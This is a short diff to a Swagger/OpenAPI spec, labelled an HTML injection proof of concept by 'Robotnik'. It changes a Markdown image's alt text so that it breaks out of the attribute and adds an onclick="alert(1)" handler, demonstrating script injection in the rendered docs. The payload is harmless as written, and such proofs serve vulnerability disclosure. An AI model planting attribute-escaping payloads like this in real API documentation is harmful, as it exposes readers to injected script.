@@ -5,7 +5,7 @@ info:
   description: |
     <h1>HTML Injection PoC by Robotnik</h1>
 
-    ![aa](https://hd2.tudocdn.net/1139888)
+    ![aa" onclick="alert(1)](https://hd2.tudocdn.net/1139888)
 
     This image was injected into Swagger using Markdown syntax.
 paths:
